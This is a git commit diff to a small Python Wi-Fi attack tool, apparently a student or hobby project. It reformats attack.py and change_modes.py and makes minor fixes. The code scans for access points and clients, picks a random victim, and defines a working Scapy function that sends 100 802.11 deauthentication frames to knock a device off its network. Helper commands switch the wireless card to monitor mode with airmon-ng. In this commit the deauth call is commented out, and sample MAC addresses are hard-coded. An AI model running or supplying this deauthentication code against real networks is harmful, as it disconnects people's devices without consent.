c7226a1e09f3d95c3afcc50642dd217d8da30412
Alon Firestein <alon@firestein.net>
2022-04-11 21:37:49 +0300

    minor fixes

--- attack.py
+++ attack.py
@@ -4,13 +4,13 @@ import sys
 import sys
 import time
 import random
-# import change_modes as modes
+import change_modes as modes
 
 
 # Global Variables
 with open("iface_name.txt", 'r') as file:
     iface = file.readline()
-    
+
 ap_list = list()
 ssid_list = list()
 users = list()
@@ -47,52 +47,48 @@ def scan_for_users():
 
 
 def deauthenticate_victim(iface, victim_mac_addr, ap_mac_addr):
-	# 802.11 frame
-	# addr1: destination MAC , addr2: source MAC,  addr3: Access Point MAC
-	dot11 = Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr)
-	# stack them up
-	packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-	# send the packet
-	sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)
-
+    # 802.11 frame
+    # addr1: destination MAC , addr2: source MAC,  addr3: Access Point MAC
+    dot11 = Dot11(addr1=victim_mac_addr, addr2=ap_mac_addr, addr3=ap_mac_addr)
+    # stack them up
+    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
+    # send the packet
+    sendp(packet, inter=0.1, count=100, iface=iface, verbose=1)
 
 
 def network_attack():
-	scan_wlan()
+    scan_wlan()
 
-	print("\nAccess Points Captured:\n\n", '\n'.join(ap_list))
-	try:
-		random_ap = random.choice(ap_list)
-	except:
-		print("List of Access Points is empty!")
-	print(f"\nRandom chosen AP is: {random_ap}")
+    print("\nAccess Points Captured:\n\n", '\n'.join(ap_list))
+    try:
+        random_ap = random.choice(ap_list)
+    except:
+        print("List of Access Points is empty!")
+        random_ap = "No AP found"
+    print(f"\nRandom chosen AP is: {random_ap}")
 
-	scan_for_users()
+    scan_for_users()
 
-	try:
-		victim = random.choice(users)
-	except:
-		print("List of Access Points is empty!")
-	print(f"\nRandom chosen victm is: {victim}")
-	print(f"\nVictim: {victim} has been hacked!!!")
+    try:
+        victim = random.choice(users)
+    except:
+        print("List of users is empty!")
+        victim = "No user found to attack!"
+    print(f"\nRandom chosen victm is: {victim}")
+
+    #victim = "c0:e8:62:82:aa:dd"
+    #ap_mac_addr = "B4:EE:B4:A8:91:13"
+    #deauthenticate_victim(iface, victim, ap_mac_addr)
 
 
-	#victim = "c0:e8:62:82:aa:dd"
-	#ap_mac_addr = "B4:EE:B4:A8:91:13"
-	#deauthenticate_victim(iface, victim, ap_mac_addr)
-	
-	
 def defense_attack():
-	pass
-
+    pass
 
 
 def main():
-	network_attack()
-	#defense_attack()
+    network_attack()
+    # defense_attack()
 
 
 if __name__ == "__main__":
-	main()
-
-
+    main()
--- change_modes.py
+++ change_modes.py
@@ -4,33 +4,35 @@ import sys
 os.system("iwconfig 2>&1 | grep -oP \"^\w+\" | tail -1 > iface_name.txt")
 with open("iface_name.txt", 'r') as file:
 	iface = file.readline()
-	
+
 print(f"The interface name is: {iface}")
 # iface = sys.argv[1]
 
 # Activating monitor mode with required interface name
+
+
 def active_monitor_mode(iface):
-	print("Activating monitor mode")
+    print("Activating monitor mode...")
     os.system("sudo service network-manager restart")
     os.system("sudo airmon-ng check kill")
-    os.system(f"sudo ifconfig {iface} down")
-    os.system(f"sudo iwconfig {iface} mode monitor")
-    os.system(f"sudo ifconfig {iface} up")
-    #os.system("sudo airmon-ng start "+ iface)
+    #os.system(f"sudo ifconfig {iface} down")
+    #os.system(f"sudo iwconfig {iface} mode monitor")
+    #os.system(f"sudo ifconfig {iface} up")
+    os.system("sudo airmon-ng start "+ iface)
+    print("Monitor mode activated!")
     return iface
     
 
 def deactivate_monitor_mode(iface):
-	print("Deactivating monitor mode")
-	os.system(f"sudo airmon-ng stop {iface}")
-    os.system("sudo systemctl start NetworkManager")
-    
-    
+    print("Deactivating monitor mode")
+    os.system(f"sudo airmon-ng stop {iface}")
+    os.system("sudo systemctl start NetworkManager") 
+    print("Monitor mode deactivated!")
     
 
 
 # Running needed commands
 active_monitor_mode(iface)
-#deactivate_monitor_mode(iface)
+# deactivate_monitor_mode(iface)
 
 
